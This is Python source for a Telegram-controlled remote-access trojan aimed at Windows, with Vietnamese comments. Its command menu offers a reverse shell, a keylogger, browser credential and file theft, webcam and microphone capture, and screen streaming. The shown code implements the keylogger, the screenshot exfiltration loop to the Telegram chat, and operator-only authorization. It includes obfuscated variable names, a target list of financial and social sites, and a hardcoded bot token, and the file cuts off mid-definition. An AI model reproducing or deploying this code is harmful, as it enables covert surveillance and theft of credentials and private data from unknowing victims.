import os
import re
import asyncio
import sys
import json
import tempfile
import time 
import platform
import getpass
import random
import shutil
import signal
import uuid
import threading
from datetime import datetime
from base64 import b64decode
from io import BytesIO
from json import loads
from sqlite3 import connect as sql_connect
from ctypes import Structure, POINTER, wintypes, windll, byref, cdll, c_char, c_buffer

# Th∆∞ vi·ªán b√™n th·ª© ba
import cv2
import numpy as np
import pyautogui
from pynput import keyboard
from Crypto.Cipher import AES
import sounddevice as sd
import wavio
import zipfile
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, BotCommandScopeDefault
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# C√°c l·ªánh bot
COMMANDS = {
    "/menu": "Hi·ªÉn th·ªã danh s√°ch c√°c l·ªánh.",
    "/shell": "M·ªü reverse shell ƒë·ªÉ th·ª±c thi l·ªánh.",
    "/stream": "Xem tr·ª±c ti·∫øp m√†n h√¨nh.",
    "/webcam": "ƒêi·ªÅu khi·ªÉn webcam (ch·ª•p ·∫£nh/quay video).",
    "/keylogger": "Ghi l·∫°i c√°c ph√≠m ƒë∆∞·ª£c nh·∫•n.",
    "/stealcreds": "Thu th·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p t·ª´ tr√¨nh duy·ªát",
    "/stealfiles": "Thu th·∫≠p c√°c file theo ƒë·ªãnh d·∫°ng",
    "/systeminfo": "L·∫•y th√¥ng tin h·ªá th·ªëng",
    "/record": "Ghi √¢m t·ª´ microphone",
}

# ƒê∆∞·ªùng d·∫´n v√† bi·∫øn m√¥i tr∆∞·ªùng
AUTHORIZED_USER_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_data.json')
LOCAL_APPDATA = os.getenv('LOCALAPPDATA')
TEMP_DIR = os.getenv("TEMP")
PC_NAME = platform.node()

# Bi·∫øn ki·ªÉm so√°t c√°c ho·∫°t ƒë·ªông
is_streaming = False
is_recording = False
is_logging = False
is_recording_audio = False
is_shell_active = False

# Bi·∫øn l∆∞u tr·ªØ task
stream_task = None
webcam_task = None
log_thread = None
audio_task = None
key_logs = []
log_interval = 60  # 60 gi√¢y = 1 ph√∫t

# Bi·∫øn l∆∞u th√¥ng tin thu th·∫≠p
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, B00KM4rK5 = [], [], [], [], [], [], [], []

# Danh s√°ch t·ª´ kh√≥a ƒë·ªÉ t√¨m trang web
k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', 
           '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', 
           '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', 
           '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', 
           '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', 
           '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', 
           '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', 
           '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', 
           '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', 
           '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', 
           '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 
           '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', 
           '[stake](https://stake.com)']

# L·ªõp DATA_BLOB cho vi·ªác gi·∫£i m√£
class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# Th√™m h√†m x·ª≠ l√Ω ph√≠m ƒë∆∞·ª£c nh·∫•n (ƒë·∫∑t ·ªü ƒë·∫ßu file, sau c√°c imports)
def on_press(key):
    global key_logs
    try:
        if not key_logs:
            key_logs.append("")
            
        # X·ª≠ l√Ω ph√≠m th√¥ng th∆∞·ªùng    
        if hasattr(key, 'char'):
            if key.char and key.char.isprintable():
                # Ch·ªâ th√™m k√Ω t·ª± n·∫øu kh√¥ng ph·∫£i l√† k√Ω t·ª± ƒëi·ªÅu khi·ªÉn
                if ord(key.char) >= 32:
                    # X·ª≠ l√Ω k√Ω t·ª± ti·∫øng Vi·ªát
                    key_logs[-1] += key.char
                    
        # X·ª≠ l√Ω ph√≠m ƒë·∫∑c bi·ªát        
        else:
            # Map c√°c ph√≠m ƒë·∫∑c bi·ªát
            special_keys = {
                'space': ' ',
                'enter': '\n',
                'backspace': '',
                'tab': '\t',
                'delete': '',
            }
            
            key_name = getattr(key, 'name', str(key))
            
            if key_name == 'enter':
                if key_logs[-1] != "":  # Ch·ªâ t·∫°o d√≤ng m·ªõi n·∫øu d√≤ng hi·ªán t·∫°i kh√¥ng tr·ªëng
                    key_logs.append("")
            elif key_name == 'backspace' and key_logs[-1]:
                key_logs[-1] = key_logs[-1][:-1]
            elif key_name in special_keys:
                key_logs[-1] += special_keys[key_name]
                
    except Exception as e:
        print(f"L·ªói khi ghi log ph√≠m: {e}")

# Th√™m h√†m b·∫Øt ƒë·∫ßu keylogger
def start_keylogger():
    global is_logging
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while is_logging:
        time.sleep(1)
    listener.stop()

# Decorator ƒë·ªÉ ki·ªÉm tra quy·ªÅn truy c·∫≠p
def require_auth(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if os.path.exists(AUTHORIZED_USER_FILE):
                with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    # Thay ƒë·ªïi c√°ch ƒë·ªçc user_id
                    authorized_id = data.get('user_id')  # ƒê·ªçc tr·ª±c ti·∫øp t·ª´ root
                    if update.effective_user.id != authorized_id:
                        if update.callback_query is not None:
                            await update.callback_query.answer(
                                "‚ö†Ô∏è B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng bot n√†y!",
                                show_alert=True
                            )
                        elif update.message is not None:
                            await update.message.reply_text(
                                "‚ö†Ô∏è B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng bot n√†y!"
                            )
                        return
            else:
                # T·∫°o file x√°c th·ª±c m·ªõi n·∫øu ch∆∞a t·ªìn t·∫°i
                data = {
                    'user_id': update.effective_user.id,  # L∆∞u tr·ª±c ti·∫øp v√†o root
                    'chat_id': update.effective_chat.id,
                    'username': update.effective_user.username,
                    'registered_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                    json.dump(data, f, ensure_ascii=False, indent=4)
                    
            return await func(update, context)
        except Exception as e:
            print(f"L·ªói khi ki·ªÉm tra quy·ªÅn truy c·∫≠p: {e}")
            try:
                if update.callback_query is not None:
                    await update.callback_query.answer(
                        "‚ùå C√≥ l·ªói x·∫£y ra!",
                        show_alert=True
                    )
                elif update.message is not None:
                    await update.message.reply_text(
                        "‚ùå C√≥ l·ªói x·∫£y ra!"
                    )
            except:
                pass
    return wrapper

async def save_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kh·ªüi t·∫°o ng∆∞·ªùi d√πng ƒë·∫ßu ti√™n ho·∫∑c ki·ªÉm tra quy·ªÅn truy c·∫≠p"""
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username
        chat_id = update.effective_chat.id

        if not os.path.exists(AUTHORIZED_USER_FILE):
            user_data = {
                'user_id': user_id,  # L∆∞u tr·ª±c ti·∫øp v√†o root
                'chat_id': chat_id,
                'username': username,
                'registered_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, ensure_ascii=False, indent=4)
            
            await update.message.reply_text(
                "üéâ Ch√†o m·ª´ng! B·∫°n ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω l√† ch·ªß s·ªü h·ªØu duy nh·∫•t c·ªßa bot.\n"
                "S·ª≠ d·ª•ng /menu ƒë·ªÉ xem danh s√°ch l·ªánh."
            )
            await notify_startup(context.bot, chat_id)
        else:
            with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if user_id == data.get('user_id'):  # ƒê·ªçc tr·ª±c ti·∫øp t·ª´ root
                    if chat_id != data.get('chat_id'):
                        data['chat_id'] = chat_id
                        with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                            json.dump(data, f, ensure_ascii=False, indent=4)
                    await update.message.reply_text(
                        "‚úÖ X√°c th·ª±c th√†nh c√¥ng!\n"
                        "S·ª≠ d·ª•ng /menu ƒë·ªÉ xem danh s√°ch l·ªánh."
                    )
                else:
                    await update.message.reply_text(
                        "‚õîÔ∏è Truy c·∫≠p b·ªã t·ª´ ch·ªëi!\n"
                        "Bot n√†y ƒë√£ c√≥ ch·ªß s·ªü h·ªØu, b·∫°n kh√¥ng th·ªÉ s·ª≠ d·ª•ng."
                    )
    except Exception as e:
        print(f"L·ªói khi x·ª≠ l√Ω ƒëƒÉng k√Ω ng∆∞·ªùi d√πng: {str(e)}")

@require_auth
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_list = "\n".join([
        f"üîª {command} ‚û°Ô∏è {desc}" for command, desc in COMMANDS.items()
    ])
    menu_text = f"DANH S√ÅCH C√ÅC L·ªÜNH\n\n{commands_list}"
    await update.message.reply_text(menu_text)

async def set_command_suggestions(application):
    """Thi·∫øt l·∫≠p menu commands cho bot"""
    commands = [
        BotCommand("/menu", "Hi·ªÉn th·ªã danh s√°ch c√°c l·ªánh"),
        BotCommand("/shell", "M·ªü reverse shell ƒë·ªÉ th·ª±c thi l·ªánh"),
        BotCommand("/stream", "Xem tr·ª±c ti·∫øp m√†n h√¨nh"),
        BotCommand("/webcam", "ƒêi·ªÅu khi·ªÉn webcam (ch·ª•p ·∫£nh/quay video)"),
        BotCommand("/keylogger", "Ghi l·∫°i c√°c ph√≠m ƒë∆∞·ª£c nh·∫•n"),
        BotCommand("/stealcreds", "Thu th·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p t·ª´ tr√¨nh duy·ªát"),
        BotCommand("/stealfiles", "Thu th·∫≠p c√°c file theo ƒë·ªãnh d·∫°ng"),
        BotCommand("/systeminfo", "L·∫•y th√¥ng tin h·ªá th·ªëng"),
        BotCommand("/record", "Ghi √¢m t·ª´ microphone"),
    ]
    await application.bot.set_my_commands(
        commands=commands,
        scope=BotCommandScopeDefault()
    )

@require_auth
@require_auth
async def start_stream(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("‚ñ∂Ô∏è B·∫Øt ƒë·∫ßu Stream", callback_data="start_stream")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Stream m√†n h√¨nh:\n"
        "Nh·∫•n n√∫t ƒë·ªÉ b·∫Øt ƒë·∫ßu xem.",
        reply_markup=reply_markup
    )

@require_auth
async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kh·ªüi t·∫°o reverse shell"""
    # Kh·ªüi t·∫°o l·ªãch s·ª≠ l·ªánh n·∫øu ch∆∞a c√≥
    if 'shell_history' not in context.user_data:
        context.user_data['shell_history'] = []
    if 'shell_safe_mode' not in context.user_data:
        context.user_data['shell_safe_mode'] = True

    keyboard = [
        [
            InlineKeyboardButton("üñ•Ô∏è B·∫Øt ƒë·∫ßu Shell", callback_data="start_shell"),
            InlineKeyboardButton("‚ùå D·ª´ng Shell", callback_data="stop_shell")
        ],
        [
            InlineKeyboardButton("üìú L·ªãch s·ª≠", callback_data="shell_history"),
            InlineKeyboardButton("üí° Auto-complete", callback_data="shell_autocomplete")
        ],
        [
            InlineKeyboardButton("üîí Ch·∫ø ƒë·ªô an to√†n ON" if context.user_data['shell_safe_mode'] else "üîì Ch·∫ø ƒë·ªô an to√†n OFF",
            callback_data="shell_safe_mode")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    help_text = (
        "üñ•Ô∏è Command Shell N√¢ng Cao:\n\n"
        "‚Ä¢ L·ªãch s·ª≠: Xem v√† s·ª≠ d·ª•ng l·∫°i l·ªánh ƒë√£ ch·∫°y\n"
        "‚Ä¢ Auto-complete: G·ª£i √Ω l·ªánh khi g√µ\n"
        "‚Ä¢ Ch·∫ø ƒë·ªô an to√†n: Ch·∫∑n c√°c l·ªánh nguy hi·ªÉm\n"
        "‚Ä¢ H·ªó tr·ª£ ƒë∆∞·ªùng d·∫´n t∆∞∆°ng ƒë·ªëi\n"
        "‚Ä¢ Hi·ªÉn th·ªã exit code c·ªßa l·ªánh"
    )
    
    await update.message.reply_text(help_text, reply_markup=reply_markup)

@require_auth
async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """X·ª≠ l√Ω shell"""
    global is_shell_active
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_shell":
            if is_shell_active:
                await query.answer("Shell ƒëang ch·∫°y!", show_alert=True)
                return
                
            is_shell_active = True
            message = await query.message.reply_text("üîÑ ƒêang kh·ªüi ƒë·ªông shell...\n\nG√µ l·ªánh ƒë·ªÉ th·ª±c thi:")
            
            # L∆∞u message_id ƒë·ªÉ theo d√µi nh·∫≠p l·ªánh
            context.user_data['shell_message'] = message.message_id
            context.user_data['waiting_for'] = 'shell_command'
            
        elif query.data == "stop_shell":
            is_shell_active = False
            context.user_data['waiting_for'] = None
            await query.edit_message_text("‚ùå ƒê√£ ƒë√≥ng shell")
            
    except Exception as e:
        await query.message.reply_text(f"‚ùå L·ªói: {str(e)}")

@require_auth
async def handle_stream_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_streaming, stream_task
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    try:
        if query.data == "start_stream":
            if is_streaming:
                await query.answer("Stream ƒëang ch·∫°y!", show_alert=True)
                return

            async def stream_screen():
                global is_streaming
                try:
                    # Kh·ªüi t·∫°o gi√° tr·ªã m·∫∑c ƒë·ªãnh n·∫øu ch∆∞a c√≥
                    if 'quality' not in context.user_data:
                        context.user_data['quality'] = 60
                    if 'fps' not in context.user_data:
                        context.user_data['fps'] = 1
                    if 'scale' not in context.user_data:
                        context.user_data['scale'] = 50

                    # G·ª≠i th√¥ng b√°o b·∫Øt ƒë·∫ßu stream v·ªõi c√°c t√πy ch·ªçn hi·ªán t·∫°i
                    keyboard = [
                        [
                            InlineKeyboardButton("‚¨ÜÔ∏è Ch·∫•t l∆∞·ª£ng", callback_data="quality_up"),
                            InlineKeyboardButton("‚¨áÔ∏è Ch·∫•t l∆∞·ª£ng", callback_data="quality_down")
                        ],
                        [
                            InlineKeyboardButton("‚¨ÜÔ∏è FPS", callback_data="fps_up"),
                            InlineKeyboardButton("‚¨áÔ∏è FPS", callback_data="fps_down")
                        ],
                        [InlineKeyboardButton("‚èπ D·ª´ng Stream", callback_data="stop_stream")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"‚úÖ ƒêang b·∫Øt ƒë·∫ßu stream...\nCh·∫•t l∆∞·ª£ng: {context.user_data['quality']}%\nFPS: {context.user_data['fps']}",
                        reply_markup=reply_markup
                    )
                    
                    while is_streaming:
                        try:
                            # Ch·ª•p m√†n h√¨nh
                            screenshot = pyautogui.screenshot()
                            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
                            
                            # Resize theo t·ªâ l·ªá
                            width = int(frame.shape[1] * context.user_data['scale'] / 100)
                            height = int(frame.shape[0] * context.user_data['scale'] / 100)
                            frame = cv2.resize(frame, (width, height))
                            
                            # N√©n ·∫£nh v·ªõi ch·∫•t l∆∞·ª£ng t√πy ch·ªânh
                            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, context.user_data['quality']])
                            bio = BytesIO(buffer)
                            bio.seek(0)

                            # T·∫°o keyboard v·ªõi c√°c n√∫t ƒëi·ªÅu khi·ªÉn
                            keyboard = [
                                [
                                    InlineKeyboardButton("‚¨ÜÔ∏è Ch·∫•t l∆∞·ª£ng", callback_data="quality_up"),
                                    InlineKeyboardButton("‚¨áÔ∏è Ch·∫•t l∆∞·ª£ng", callback_data="quality_down")
                                ],
                                [
                                    InlineKeyboardButton("‚¨ÜÔ∏è FPS", callback_data="fps_up"),
                                    InlineKeyboardButton("‚¨áÔ∏è FPS", callback_data="fps_down")
                                ],
                                [InlineKeyboardButton("‚èπ D·ª´ng Stream", callback_data="stop_stream")]
                            ]
                            reply_markup = InlineKeyboardMarkup(keyboard)
                            
                            # G·ª≠i frame v·ªõi th√¥ng tin stream hi·ªán t·∫°i
                            await context.bot.send_photo(
                                chat_id=chat_id,
                                photo=bio,
                                caption=f"üé• Live stream | Ch·∫•t l∆∞·ª£ng: {context.user_data['quality']}% | FPS: {context.user_data['fps']}",
                                reply_markup=reply_markup
                            )
                            
                            # ƒêi·ªÅu ch·ªânh delay theo FPS hi·ªán t·∫°i
                            await asyncio.sleep(1/context.user_data['fps'])
                            
                        except Exception as frame_error:
                            print(f"L·ªói khi x·ª≠ l√Ω frame: {frame_error}")
                            await asyncio.sleep(1)  # Tr√°nh spam l·ªói
                except Exception as e:
                    print(f"L·ªói trong stream_screen: {e}")
                finally:
                    is_streaming = False
                    # G·ª≠i th√¥ng b√°o m·ªõi thay v√¨ edit
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text="‚ùå Stream ƒë√£ d·ª´ng"
                        )
                    except:
                        pass

            is_streaming = True
            stream_task = asyncio.create_task(stream_screen())
            # X√≥a message g·ªëc thay v√¨ edit
            try:
                await query.message.delete()
            except:
                pass
            
        elif query.data == "quality_up":
            # TƒÉng ch·∫•t l∆∞·ª£ng JPEG th√™m 10%
            if 'quality' not in context.user_data:
                context.user_data['quality'] = 60
            context.user_data['quality'] = min(100, context.user_data['quality'] + 10)
            await query.answer(f"ƒê√£ tƒÉng ch·∫•t l∆∞·ª£ng l√™n {context.user_data['quality']}%")
            
        elif query.data == "quality_down":
            # Gi·∫£m ch·∫•t l∆∞·ª£ng JPEG ƒëi 10%
            if 'quality' not in context.user_data:
                context.user_data['quality'] = 60
            context.user_data['quality'] = max(10, context.user_data['quality'] - 10)
            await query.answer(f"ƒê√£ gi·∫£m ch·∫•t l∆∞·ª£ng xu·ªëng {context.user_data['quality']}%")
            
        elif query.data == "fps_up":
            # TƒÉng FPS th√™m 1
            if 'fps' not in context.user_data:
                context.user_data['fps'] = 1
            context.user_data['fps'] = min(10, context.user_data['fps'] + 1)
            await query.answer(f"ƒê√£ tƒÉng FPS l√™n {context.user_data['fps']}")
            
        elif query.data == "fps_down":
            # Gi·∫£m FPS ƒëi 1
            if 'fps' not in context.user_data:
                context.user_data['fps'] = 1
            context.user_data['fps'] = max(1, context.user_data['fps'] - 1)
            await query.answer(f"ƒê√£ gi·∫£m FPS xu·ªëng {context.user_data['fps']}")
            
        elif query.data == "stop_stream":
            if not is_streaming:
                await query.answer("Stream ƒë√£ d·ª´ng!", show_alert=True)
                return
            
            is_streaming = False
            if stream_task:
                stream_task.cancel()
                stream_task = None
            # Ch·ªâ edit message hi·ªán t·∫°i (message c√≥ n√∫t stop)
            try:
                await query.edit_message_caption(
                    caption="‚úÖ ƒê√£ d·ª´ng stream t·∫°i ·∫£nh n√†y",
                    reply_markup=None
                )
            except:
                pass
            
    except Exception as e:
        print(f"L·ªói trong stream control: {e}")
        await query.answer("‚ùå C√≥ l·ªói x·∫£y ra", show_alert=True)

async def notify_startup(bot, chat_id=None):
    """G·ª≠i th√¥ng b√°o khi bot kh·ªüi ƒë·ªông"""
    # B·ªè qua g·ª≠i th√¥ng b√°o n·∫øu ch∆∞a c√≥ file c·∫•u h√¨nh
    if not os.path.exists(AUTHORIZED_USER_FILE):
        print("‚ö†Ô∏è Ch∆∞a c√≥ file c·∫•u h√¨nh bot_data.json")
        return
        
    try:
        # N·∫øu kh√¥ng c√≥ chat_id, ƒë·ªçc t·ª´ file
        if chat_id is None:
            try:
                with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    chat_id = data.get('chat_id')
                    if not chat_id:
                        print("‚ö†Ô∏è Kh√¥ng t√¨m th·∫•y chat_id trong file c·∫•u h√¨nh")
                        return
            except Exception as e:
                print(f"‚ùå L·ªói khi ƒë·ªçc file c·∫•u h√¨nh: {str(e)}")
                return

        # Ch·ªâ g·ª≠i th√¥ng b√°o n·∫øu c√≥ chat_id h·ª£p l·ªá
        startup_message = "ü§ñ Bot ƒë√£ online v√† s·∫µn s√†ng!\n\n"
        print(f"üîÑ ƒêang g·ª≠i th√¥ng b√°o kh·ªüi ƒë·ªông t·ªõi chat_id: {chat_id}")
        
        try:
            await bot.send_message(
                chat_id=chat_id,
                text=startup_message
            )
            print(f"‚úÖ ƒê√£ g·ª≠i th√¥ng b√°o kh·ªüi ƒë·ªông th√†nh c√¥ng")
        except Exception as e:
            if "Chat not found" in str(e):
                print(f"‚ùå Chat_id {chat_id} kh√¥ng t·ªìn t·∫°i ho·∫∑c bot ch∆∞a ƒë∆∞·ª£c kh·ªüi ƒë·ªông l·∫ßn ƒë·∫ßu")
            else:
                print(f"‚ùå L·ªói khi g·ª≠i th√¥ng b√°o: {str(e)}")
    except Exception as e:
        print(f"‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh: {str(e)}")

def is_bot_already_running():
    """Ki·ªÉm tra xem bot ƒë√£ ƒëang ch·∫°y hay ch∆∞a b·∫±ng c∆° ch·∫ø file lock"""
    bot_lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
    
    try:
        # N·∫øu file lock t·ªìn t·∫°i, ki·ªÉm tra PID
        if os.path.exists(bot_lock_file):
            # ƒê·ªçc th√¥ng tin t·ª´ file lock
            with open(bot_lock_file, 'r') as f:
                content = f.read().strip()
                
            # Ph√¢n t√≠ch th√¥ng tin PID v√† timestamp
            if ',' in content:
                parts = content.split(',')
                old_pid = int(parts[0])
                timestamp = parts[1]
                
                # Ki·ªÉm tra xem file lock c√≥ c≈© h∆°n 30 ph√∫t kh√¥ng
                try:
                    lock_time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                    if (datetime.now() - lock_time).total_seconds() > 1800:  # 30 ph√∫t
                        # File lock qu√° c≈©, x√≥a v√† t·∫°o m·ªõi
                        os.remove(bot_lock_file)
                        create_lock_file(bot_lock_file)
                        return False
                except ValueError:
                    # Timestamp kh√¥ng h·ª£p l·ªá, x√≥a v√† t·∫°o m·ªõi
                    os.remove(bot_lock_file)
                    create_lock_file(bot_lock_file)
                    return False
            else:
                # Format kh√¥ng h·ª£p l·ªá, c·ªë g·∫Øng ph√¢n t√≠ch th√†nh PID
                try:
                    old_pid = int(content)
                except ValueError:
                    # Kh√¥ng ph·∫£i s·ªë, x√≥a v√† t·∫°o m·ªõi
                    os.remove(bot_lock_file)
                    create_lock_file(bot_lock_file)
                    return False
            
            # Ki·ªÉm tra xem ti·∫øn tr√¨nh c√≥ t·ªìn t·∫°i kh√¥ng
            if is_process_running(old_pid):
                return True
            
            # Ti·∫øn tr√¨nh kh√¥ng t·ªìn t·∫°i, x√≥a v√† t·∫°o m·ªõi file lock
            os.remove(bot_lock_file)
        
        # T·∫°o file lock m·ªõi
        create_lock_file(bot_lock_file)
        return False
        
    except Exception as e:
        print(f"L·ªói khi ki·ªÉm tra instance: {e}")
        # Trong tr∆∞·ªùng h·ª£p l·ªói, th·ª≠ x√≥a file lock n·∫øu t·ªìn t·∫°i
        try:
            if os.path.exists(bot_lock_file):
                os.remove(bot_lock_file)
            create_lock_file(bot_lock_file)
        except:
            pass
        return False

def create_lock_file(lock_file_path):
    """T·∫°o file lock v·ªõi PID hi·ªán t·∫°i v√† timestamp"""
    with open(lock_file_path, 'w') as f:
        f.write(f"{os.getpid()},{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def is_process_running(pid):
    """Ki·ªÉm tra xem ti·∫øn tr√¨nh c√≥ ƒëang ch·∫°y kh√¥ng d·ª±a tr√™n PID"""
    if platform.system() == "Windows":
        # C√°ch ki·ªÉm tra cho Windows
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            process = kernel32.OpenProcess(1, 0, pid)
            if process:
                kernel32.CloseHandle(process)
                return True
            return False
        except:
            return False
    else:
        # C√°ch ki·ªÉm tra cho Unix/Linux
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

async def main():
    """H√†m ch√≠nh c·ªßa ·ª©ng d·ª•ng bot Telegram"""
    try:
   
        # Ki·ªÉm tra n·∫øu bot ƒë√£ ƒëang ch·∫°y
        if is_bot_already_running():
            print("‚ö†Ô∏è Bot ƒë√£ ƒëang ch·∫°y! Kh√¥ng th·ªÉ ch·∫°y th√™m instance m·ªõi.")
            sys.exit(1)
        
        # Token bot Telegram
        TOKEN = '7850235518:AAGbSEqxiBsJHTCf-UPY2wGBB6Erig-WX_U'
    
        # Kh·ªüi t·∫°o ·ª©ng d·ª•ng
        application = setup_telegram_application(TOKEN)
        
        # Kh·ªüi ƒë·ªông bot v√† b·∫Øt ƒë·∫ßu polling
        await start_telegram_bot(application)
        
        # Thi·∫øt l·∫≠p x·ª≠ l√Ω t√≠n hi·ªáu h·ªá th·ªëng
        setup_signal_handlers(application)
        
        # V√≤ng l·∫∑p ch√≠nh - gi·ªØ cho bot ch·∫°y
        print("‚úÖ Bot ƒë√£ kh·ªüi ƒë·ªông th√†nh c√¥ng!")
        await keep_bot_running(application)
            
    except KeyboardInterrupt:
        print("\n‚ö†Ô∏è Nh·∫≠n t√≠n hi·ªáu KeyboardInterrupt")
        if 'application' in locals():
            await graceful_shutdown(application)
    except SystemExit:
        # ƒê√£ x·ª≠ l√Ω ·ªü tr√™n
        pass
    except Exception as e:
        print(f"‚ùå L·ªói kh·ªüi ƒë·ªông bot: {e}")
        if 'application' in locals():
            await graceful_shutdown(application)
    finally:
        # ƒê·∫£m b·∫£o t·∫•t c·∫£ ƒë·ªÅu ƒë∆∞·ª£c d·ªçn d·∫πp
        if 'application' in locals():
            await graceful_shutdown(application)
            
def setup_telegram_application(token):
    """Thi·∫øt l·∫≠p ·ª©ng d·ª•ng Telegram v·ªõi handlers"""
    application = ApplicationBuilder().token(token).build()
    
    # Danh s√°ch command handlers
    command_handlers = [
        ("start", save_chat_id),
        ("menu", menu),
        ("shell", shell_command),
        ("stream", start_stream),
        ("webcam", webcam_control),
        ("keylogger", keylogger_control),
        ("stealcreds", steal_creds),
        ("stealfiles", steal_files),
        ("systeminfo", system_info),
        ("record", record_control),
    ]
    
    # Danh s√°ch callback query handlers
    callback_handlers = [
        (handle_stream_control, "^(start_stream|stop_stream)$"),
        (handle_webcam, "^(webcam_photo|webcam_video|stop_recording)$"),
        (handle_keylogger, "^(start_logging|stop_logging)$"),
        (handle_audio_recording, "^(start_recording_audio|stop_recording_audio)$"),
        (handle_shell, "^(start_shell|stop_shell)$"),
    ]
    
    # ƒêƒÉng k√Ω message handler cho shell command
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        handle_text_message
    ))
    
    # ƒêƒÉng k√Ω command handlers
    for command, handler in command_handlers:
        application.add_handler(CommandHandler(command, handler))
    
    # ƒêƒÉng k√Ω callback query handlers
    for handler, pattern in callback_handlers:
        application.add_handler(CallbackQueryHandler(handler, pattern=pattern))
    

    return application

async def start_telegram_bot(application):
    """Kh·ªüi ƒë·ªông bot v√† b·∫Øt ƒë·∫ßu polling"""
    # Thi·∫øt l·∫≠p command suggestions
    await set_command_suggestions(application)
    
    # Th√¥ng b√°o kh·ªüi ƒë·ªông
    await notify_startup(application.bot)
    
    # Kh·ªüi ƒë·ªông application
    await application.initialize()
    await application.start()
    
    # B·∫Øt ƒë·∫ßu polling v·ªõi t√πy ch·ªçn ·ªïn ƒë·ªãnh
    await application.updater.start_polling(
        poll_interval=1.0,
        timeout=30,
        bootstrap_retries=5,
        drop_pending_updates=True,
        allowed_updates=None
    )

def setup_signal_handlers(application):
    """Thi·∫øt l·∫≠p x·ª≠ l√Ω t√≠n hi·ªáu h·ªá th·ªëng"""
    def signal_handler():
        asyncio.create_task(graceful_shutdown(application))
    
    try:
        loop = asyncio.get_event_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, signal_handler)
            except NotImplementedError:
                # Windows kh√¥ng h·ªó tr·ª£ add_signal_handler
                pass
    except Exception as e:
        print(f"‚ö†Ô∏è Kh√¥ng th·ªÉ thi·∫øt l·∫≠p x·ª≠ l√Ω t√≠n hi·ªáu: {e}")

async def keep_bot_running(application):
    """Gi·ªØ cho bot ch·∫°y v·ªõi x·ª≠ l√Ω l·ªói"""
    running = True
    while running:
        try:
            await asyncio.sleep(1)
        except asyncio.CancelledError:
            running = False
            print("‚ö†Ô∏è Nh·∫≠n t√≠n hi·ªáu h·ªßy b·ªè...")
            await graceful_shutdown(application)
        except KeyboardInterrupt:
            running = False
            print("‚ö†Ô∏è Nh·∫≠n t√≠n hi·ªáu KeyboardInterrupt...")
            await graceful_shutdown(application)

# Th√™m h√†m shell command
@require_auth
